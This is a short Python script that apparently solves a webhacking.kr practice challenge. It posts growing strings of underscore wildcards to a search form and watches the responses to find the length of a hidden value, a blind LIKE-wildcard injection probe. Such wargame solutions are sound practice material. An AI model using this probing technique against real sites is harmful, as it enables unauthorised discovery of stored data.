import requests

sess = requests.Session()
url = 'https://webhacking.kr/challenge/web-33/'
wildcard = ''

i = 0
while True:
    wildcard += '_'
    i += 1
    data = {
        'search' : wildcard
    }
    res = sess.post(url, data=data)

    if('admin' not in res.text):
        print('length = ', i)
        break